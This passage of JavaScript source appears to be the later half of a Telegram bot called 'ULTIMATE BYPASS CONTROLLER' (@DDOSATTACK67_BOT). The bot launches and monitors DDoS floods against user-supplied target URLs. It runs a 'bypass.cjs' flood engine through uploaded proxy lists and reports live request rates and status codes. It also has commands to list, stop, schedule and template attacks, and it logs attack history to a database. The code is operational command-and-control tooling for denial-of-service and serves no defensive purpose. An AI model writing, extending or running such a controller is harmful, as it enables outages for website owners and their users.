    let statusSummary = '';
    if (Object.keys(attack.detailedCodes).length > 0) {
        const topCodes = Object.entries(attack.detailedCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3);
        
        statusSummary = topCodes.map(([code, count]) => {
            let emoji = '⚪';
            if (code.startsWith('2')) emoji = '✅';
            else if (code.startsWith('3')) emoji = '🔄';
            else if (code.startsWith('4')) emoji = '❌';
            else if (code.startsWith('5')) emoji = '⚠️';
            return `${emoji} ${code}: ${formatNumber(count)}`;
        }).join(' | ');
    }
    
    const updateText = 
        `🚀 *ATTACK IN PROGRESS* 🚀\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${attack.url.substring(0, 30)}${attack.url.length > 30 ? '...' : ''}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s (${timeDisplay} left)\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *TRAFFIC STATS*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📥 Total: ${formatNumber(attack.requestCount || 0)}\n` +
        `⚡ Rate: ${rps} req/s\n` +
        `${successEmoji} Success: ${formatNumber(attack.successCount || 0)} (${attack.successRate}%)\n` +
        `❌ Failed: ${formatNumber(attack.failCount || 0)}\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔍 *TOP STATUS CODES*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `${statusSummary || 'Collecting data...'}\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `👤 @${attack.username}`;
    
    await safeEditMessage(
        attack.chatId,
        attack.messageId,
        updateText,
        { parse_mode: 'Markdown' }
    );
}

// Handle attack end
async function handleAttackEnd(attackId, code) {
    const attackData = attacks.get(attackId);
    if (!attackData) return;
    
    attackData.isRunning = false;
    
    if (attackData.interval) {
        clearInterval(attackData.interval);
    }
    
    const elapsed = Math.min(attackData.duration, Math.floor((Date.now() - attackData.startTime) / 1000));
    const successEmoji = getSuccessRateEmoji(attackData.successRate);
    
    // Save to database
    saveAttackToDB({
        ...attackData,
        id: attackId,
        elapsed
    });
    
    // Determine status
    let statusEmoji, statusText;
    if (code === 0) {
        statusEmoji = '✅';
        statusText = 'COMPLETED SUCCESSFULLY';
    } else if (code === 1) {
        statusEmoji = '⚠️';
        statusText = 'COMPLETED WITH ERRORS';
    } else {
        statusEmoji = '🛑';
        statusText = `CRASHED (CODE ${code})`;
    }
    
    // Format final stats
    const categorySummary = 
        `✅ 2xx: ${formatNumber(attackData.statusCodes['2xx'])} | ` +
        `🔄 3xx: ${formatNumber(attackData.statusCodes['3xx'])}\n` +
        `❌ 4xx: ${formatNumber(attackData.statusCodes['4xx'])} | ` +
        `⚠️ 5xx: ${formatNumber(attackData.statusCodes['5xx'])} | ` +
        `⚪ Other: ${formatNumber(attackData.statusCodes['other'])}`;
    
    const finalMessage = 
        `${statusEmoji} *ATTACK ${statusText}* ${statusEmoji}\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${attackData.url}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `⏱️ *Duration:* ${elapsed}s/${attackData.duration}s\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *FINAL STATISTICS*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📥 Total Requests: ${formatNumber(attackData.requestCount || 0)}\n` +
        `${successEmoji} Success Rate: ${attackData.successRate}%\n` +
        `✅ Successful: ${formatNumber(attackData.successCount || 0)}\n` +
        `❌ Failed: ${formatNumber(attackData.failCount || 0)}\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔍 *STATUS CODE SUMMARY*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `${categorySummary}\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `⚡ Exit Code: ${code}\n` +
        `👤 @${attackData.username}`;
    
    await safeEditMessage(
        attackData.chatId,
        attackData.messageId,
        finalMessage,
        { parse_mode: 'Markdown' }
    );
    
    attacks.delete(attackId);
    lastPercent.delete(attackId);
}

// Stats command
bot.command('stats', (ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((sum, a) => sum + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((sum, a) => sum + (a.successCount || 0), 0);
    const totalFail = Array.from(attacks.values()).reduce((sum, a) => sum + (a.failCount || 0), 0);
    
    const overallRate = totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0;
    const overallEmoji = getSuccessRateEmoji(overallRate);
    
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);
    
    // Get database stats
    db.get('SELECT COUNT(*) as count, SUM(requests) as total FROM attacks', (err, row) => {
        const historicalAttacks = row?.count || 0;
        const historicalReqs = row?.total || 0;
        
        let statsMessage = 
            `📊 *BOT STATISTICS*\n\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `⚡ *CURRENT ATTACKS*\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `▶️ Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
            `📊 Active: ${attacks.size}\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `📥 *TRAFFIC (CURRENT)*\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `📊 Requests: ${formatNumber(totalReqs)}\n` +
            `✅ Success: ${formatNumber(totalSuccess)}\n` +
            `❌ Failed: ${formatNumber(totalFail)}\n` +
            `${overallEmoji} Rate: ${overallRate}%\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `📚 *HISTORICAL*\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `📊 Total Attacks: ${historicalAttacks}\n` +
            `📥 Total Requests: ${formatNumber(historicalReqs)}\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `🔄 *PROXIES*\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `📊 Loaded: ${formatNumber(proxyCount)}\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `⏱️ *UPTIME*\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `🕒 ${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s\n`;
        
        if (isAdmin) {
            const memory = process.memoryUsage();
            statsMessage += 
                `━━━━━━━━━━━━━━━━━━━\n` +
                `🖥️ *SYSTEM*\n` +
                `━━━━━━━━━━━━━━━━━━━\n` +
                `💾 RSS: ${Math.round(memory.rss / 1024 / 1024)} MB\n` +
                `📦 Heap: ${Math.round(memory.heapUsed / 1024 / 1024)}/${Math.round(memory.heapTotal / 1024 / 1024)} MB\n`;
        }
        
        ctx.reply(statsMessage, { parse_mode: 'Markdown' });
    });
});

// System command
bot.command('system', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    const memory = process.memoryUsage();
    const cpu = process.cpuUsage();
    const uptime = process.uptime();
    
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);
    
    ctx.reply(
        `🖥️ *SYSTEM PERFORMANCE*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `⏱️ *UPTIME*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🕒 ${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `💾 *MEMORY USAGE*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 RSS: ${Math.round(memory.rss / 1024 / 1024)} MB\n` +
        `📦 Heap Used: ${Math.round(memory.heapUsed / 1024 / 1024)} MB\n` +
        `📦 Heap Total: ${Math.round(memory.heapTotal / 1024 / 1024)} MB\n` +
        `📋 External: ${Math.round(memory.external / 1024 / 1024)} MB\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `⚙️ *CPU USAGE*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔧 User: ${Math.round(cpu.user / 1000)} ms\n` +
        `🔧 System: ${Math.round(cpu.system / 1000)} ms`,
        { parse_mode: 'Markdown' }
    );
});

// List command
bot.command('list', (ctx) => {
    if (attacks.size === 0) {
        return ctx.reply('📊 *No Active Attacks*\n\nUse `/attack` to start one!', 
            { parse_mode: 'Markdown' });
    }

    let msg = '📊 *ACTIVE ATTACKS*\n\n';
    let count = 1;
    
    for (const [id, attack] of attacks) {
        if (!attack.isRunning) continue;
        
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
        const filled = Math.floor(percent / 10);
        const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
        
        const rateEmoji = getSuccessRateEmoji(attack.successRate);
        
        msg += `*${count}.* \`${id.slice(-8)}\`\n`;
        msg += `   👤 @${attack.username}\n`;
        msg += `   🎯 ${attack.url.substring(0, 25)}...\n`;
        msg += `   📊 ${progressBar} ${percent}%\n`;
        msg += `   ⏱️ ${elapsed}s/${attack.duration}s\n`;
        msg += `   📥 ${formatNumber(attack.requestCount || 0)} req\n`;
        msg += `   ${rateEmoji} ${attack.successRate}%\n\n`;
        count++;
        if (count > 5) break;
    }
    
    if (count > 5) {
        msg += `_... and ${attacks.size - 5} more_`;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// Progress command
bot.command('progress', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    
    if (!attackId) {
        return ctx.reply('❌ Usage: `/progress <attack_id>`', { parse_mode: 'Markdown' });
    }
    
    const attack = attacks.get(attackId);
    if (!attack) {
        return ctx.reply('❌ Attack ID not found');
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const filled = Math.floor(percent / 10);
    const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
    
    const rateEmoji = getSuccessRateEmoji(attack.successRate);
    
    // Category summary
    const categorySummary = 
        `✅ 2xx: ${formatNumber(attack.statusCodes['2xx'])} | ` +
        `🔄 3xx: ${formatNumber(attack.statusCodes['3xx'])}\n` +
        `❌ 4xx: ${formatNumber(attack.statusCodes['4xx'])} | ` +
        `⚠️ 5xx: ${formatNumber(attack.statusCodes['5xx'])}`;
    
    ctx.reply(
        `📊 *ATTACK DETAILS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `👤 *User:* @${attack.username}\n` +
        `🎯 *Target:* ${attack.url}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *STATISTICS*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📥 Requests: ${formatNumber(attack.requestCount || 0)}\n` +
        `${rateEmoji} Success: ${formatNumber(attack.successCount || 0)} (${attack.successRate}%)\n` +
        `❌ Failed: ${formatNumber(attack.failCount || 0)}\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔍 *STATUS CODES*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `${categorySummary}\n\n` +
        `⚡ Status: ${attack.isRunning ? '✅ Running' : '⏹️ Stopped'}`,
        { parse_mode: 'Markdown' }
    );
});

// Stop command
bot.command('stop', async (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    
    if (!attackId) {
        return ctx.reply('❌ Usage: `/stop <attack_id>`', { parse_mode: 'Markdown' });
    }
    
    const attack = attacks.get(attackId);
    if (!attack) {
        return ctx.reply('❌ Attack ID not found. Use `/list` to see active attacks.', 
            { parse_mode: 'Markdown' });
    }

    // Check ownership
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ You can only stop your own attacks!');
    }

    try {
        attack.process.kill('SIGINT');
    } catch (err) {
        console.log('Error killing process:', err);
    }
    
    attack.isRunning = false;
    
    if (attack.interval) {
        clearInterval(attack.interval);
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const filled = Math.floor(percent / 10);
    const progressBar = '🟨'.repeat(filled) + '⬜'.repeat(10 - filled);
    
    await safeEditMessage(
        attack.chatId,
        attack.messageId,
        `🛑 *ATTACK STOPPED*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${attack.url}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n` +
        `📊 ${formatNumber(attack.requestCount || 0)} requests\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `👤 @${ctx.from.username || 'user'}`,
        { parse_mode: 'Markdown' }
    );
    
    ctx.reply(`✅ Attack \`${attackId}\` stopped.`, { parse_mode: 'Markdown' });
    attacks.delete(attackId);
    lastPercent.delete(attackId);
});

// Setproxy command
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    ctx.reply(
        `📤 *PROXY UPLOAD*\n\n` +
        `Send a \`proxy.txt\` file with one proxy per line.\n\n` +
        `📝 *Format:* \`ip:port\`\n` +
        `✅ *Example:*\n\`\`\`\n192.168.1.1:8080\n203.45.67.89:3128\n\`\`\``,
        { parse_mode: 'Markdown' }
    );
});

// Handle file upload
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxies...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'))
                .map(line => line.split(' ')[0].trim());
            
            const unique = [...new Set(proxies)].slice(0, CONFIG.MAX_PROXY_LINES);
            
            fs.writeFileSync('proxy.txt', unique.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ *Proxies Loaded*\n\n📊 ${unique.length} valid proxies`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            ctx.reply('❌ Upload failed: ' + error.message);
        }
    }
});

// Stop all attacks
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    
    const count = attacks.size;
    if (count === 0) {
        return ctx.reply('📊 No active attacks');
    }
    
    attacks.forEach((attack, id) => {
        if (attack.isRunning) {
            try {
                attack.process.kill('SIGINT');
            } catch (err) {}
            if (attack.interval) {
                clearInterval(attack.interval);
            }
        }
        attacks.delete(id);
        lastPercent.delete(id);
    });
    
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// Status command
bot.command('status', (ctx) => {
    ctx.reply(
        `✅ *Bot Status*\n\n` +
        `🟢 Online\n` +
        `⚡ Attacks: ${countRunningAttacks()} running\n` +
        `📊 Total: ${attacks.size}\n` +
        `📁 bypass.cjs: ${fs.existsSync('bypass.cjs') ? '✅' : '❌'}\n` +
        `📁 proxy.txt: ${fs.existsSync('proxy.txt') ? '✅' : '❌'}\n` +
        `📁 database: ${fs.existsSync('attacks.db') ? '✅' : '❌'}\n` +
        `📋 templates: ${templates.size}\n` +
        `⏰ scheduled: ${schedule.size}\n\n` +
        `🤖 @DDOSATTACK67_BOT`,
        { parse_mode: 'Markdown' }
    );
});

// About command
bot.command('about', (ctx) => {
    ctx.reply(
        `ℹ️ *ULTIMATE BYPASS CONTROLLER*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🤖 *Version:* 3.0.0\n` +
        `⚡ *Engine:* bypass.cjs\n` +
        `🔄 *Proxy:* HTTP/HTTPS\n` +
        `👑 *Admin:* ${ADMIN_ID}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `✨ *Features:*\n` +
        `├ 🚀 Multi-target attacks\n` +
        `├ ⏰ Attack scheduling\n` +
        `├ 📋 Attack templates\n` +
        `├ 📊 SQLite database\n` +
        `├ 📈 Real-time graphs\n` +
        `├ 🔍 Attack analysis\n` +
        `├ 📡 Bot network\n` +
        `├ 🎮 Apex Legends style\n` +
        `└ 📤 Export results\n\n` +
        `📱 @DDOSATTACK67_BOT`,
        { parse_mode: 'Markdown' }
    );
});

// Test command
bot.command('test', (ctx) => {
    ctx.reply('✅ *Bot is fully operational!*\n\nAll 20+ features are loaded and ready!', 
        { parse_mode: 'Markdown' });
});

// Error handling
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
});

// Schedule cleanup for old database entries (run daily at 3 AM)
cron.schedule('0 3 * * *', () => {
    const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
    db.run('DELETE FROM attacks WHERE timestamp < ?', [thirtyDaysAgo]);
    console.log('🧹 Cleaned up old database entries');
});

// Start bot (use webhook for Railway)
const webhookUrl = process.env.RAILWAY_STATIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
if (webhookUrl) {
    bot.telegram.setWebhook(`${webhookUrl}/webhook`)
        .then(() => console.log('✅ Webhook set to:', `${webhookUrl}/webhook`));
} else {
    console.log('⚠️ No webhook URL, falling back to polling');
    bot.launch();
}

// Add webhook endpoint
app.post('/webhook', (req, res) => {
    bot.handleUpdate(req.body);
    res.sendStatus(200);
});

console.log('\n╔════════════════════════════════════╗');
console.log('║    🔥 ULTIMATE BYPASS CONTROLLER   ║');
console.log('╠════════════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}                 ║`);
console.log(`║  🤖 Bot: @DDOSATTACK67_BOT          ║`);
console.log(`║  🌐 Webhook: ${webhookUrl ? '✅' : '❌'}                      ║`);
console.log(`║  ✨ Features: 20+ loaded             ║`);
console.log('╚════════════════════════════════════╝');

const proxyCount = loadAndCleanProxies().length;
console.log(`📊 Loaded ${proxyCount} proxies`);
console.log(`📋 Loaded ${templates.size} templates`);
console.log(`📚 Database: attacks.db`);
console.log('✅ Bot is online! Send /start on Telegram\n');

// Graceful shutdown
process.once('SIGINT', () => {
    console.log('\n🛑 Shutting down bot...');
    
    // Stop all attacks
    attacks.forEach((attack) => {
        if (attack.isRunning) {
            try {
                attack.process.kill('SIGINT');
            } catch (err) {}
        }
    });
    
    // Clear all schedules
    schedule.forEach((timeout) => {
        clearTimeout(timeout);
    });
    
    // Close database
    db.close();
    
    bot.stop('SIGINT');
    setTimeout(() => process.exit(0), 1000);
});

process.once('SIGTERM', () => {
    console.log('\n🛑 Shutting down bot...');
    bot.stop('SIGTERM');
    db.close();
    setTimeout(() => process.exit(0), 1000);
});

// Prevent uncaught exceptions from crashing
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});